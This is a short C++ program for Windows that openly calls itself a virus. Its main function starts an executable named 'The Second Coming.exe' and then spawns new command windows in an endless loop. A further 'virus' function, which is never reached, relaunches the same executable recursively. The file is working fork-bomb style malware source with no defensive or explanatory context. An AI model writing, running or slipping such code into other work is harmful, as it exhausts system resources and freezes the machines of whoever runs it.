#include <windows.h>
using namespace std;

void virus() {
	while (1) {
		ShellExecute(nullptr, "open", "The Second Coming.exe", 0, 0, 0);
		virus();
	}
}

int main(int argc, char *argv[]) {
	ShellExecuteA(0, "open", "The Second Coming.exe", 0, 0, 0);
	while (1) {
		system("start");
	}
	virus();
	main(0, 0);
	return 0;
}